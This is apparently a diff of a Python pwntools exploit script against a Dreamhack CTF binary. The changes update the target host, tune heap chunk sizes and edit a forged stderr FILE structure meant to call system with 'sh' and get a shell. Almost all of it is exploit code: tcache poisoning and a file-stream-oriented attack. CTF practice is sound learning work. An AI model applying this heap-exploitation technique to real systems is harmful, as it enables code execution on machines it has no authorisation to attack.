@@ -5,7 +5,7 @@ context.arch = "amd64"
 context.binary = elf = ELF('./prob')
 #context.log_level = "debug"
 context.terminal = ['tmux', 'splitw', '-h']
-HOST, PORT = "host3.dreamhack.games 11454".split()
+HOST, PORT = "host8.dreamhack.games 13596".split()
 
 def slog(n, a): return info(": ".join([n, hex(a)]))
 
@@ -70,8 +70,8 @@ __pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
     return FSOP
 
 # 적당히 큰 청크 2개
-create(0, 11, b'A'*0x15000, 0x15000)
-create(1, 11, b'B'*0x1000, 0x1000)
+create(0, 11, b'A'*0x10000, 0x10000)
+create(1, 11, b'B'*0x100, 0x100)
 
 add(0, 1) # 이걸로 unsorted bin에 보내기
 # 빈 거 하나 올리고
@@ -112,7 +112,7 @@ for i in range(7, 4, -1):
 fake_fsop = libc.sym["_IO_2_1_stderr_"]
 
 pay = FSOP_struct(
-    flags = u64(b"\x01\x01\x01\x01;sh\x00"),
+    flags = u64(b"  sh\x00\x00\x00\x00"),
     lock = fake_fsop + 0x1000,
     _wide_data = fake_fsop-0x10,
     _markers = system,
@@ -123,7 +123,7 @@ pay = FSOP_struct(
 print(hex(len(pay)))
 
 create(8, 11, b'A'*0x18 + p64(0x111) + p64((stderr) ^ (heap >> 12)) + b'\n', -1)
-create(9, 11, b'B'*0x100, 0x100) # 빼고 stderrㅇ 꺼낼 준비
+create(9, 11, b'B'*0x100, 0x100) # 빼고 stderr 꺼낼 준비
 create(10, 11, pay.ljust(0x100, b'\x00') + b'\n', 0x100)
 
 #gdb.attach(p);pause()
